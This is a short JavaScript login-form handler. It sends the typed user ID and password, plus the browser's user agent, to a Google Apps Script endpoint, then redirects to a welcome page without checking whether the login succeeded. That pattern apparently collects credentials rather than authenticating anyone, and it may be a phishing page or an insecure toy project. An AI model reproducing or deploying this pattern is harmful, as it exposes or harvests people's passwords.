const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyq4BfnwGRskiAfwtvQ2NYx6B3fClC-gH0xRH6EZL8Kz3_IlP8SOOGja8J_h1etASBm/exec";

document.getElementById("loginForm").addEventListener("submit", async function(e){

    e.preventDefault();

    const userid=document.getElementById("userid").value;
    const password=document.getElementById("password").value;

    const data={
        userid:userid,
        password:password,
        browser:navigator.userAgent
    };

    await fetch(WEBAPP_URL,{
        method:"POST",
        body:JSON.stringify(data)
    });

    window.location="welcome.html?user="+encodeURIComponent(userid);

});
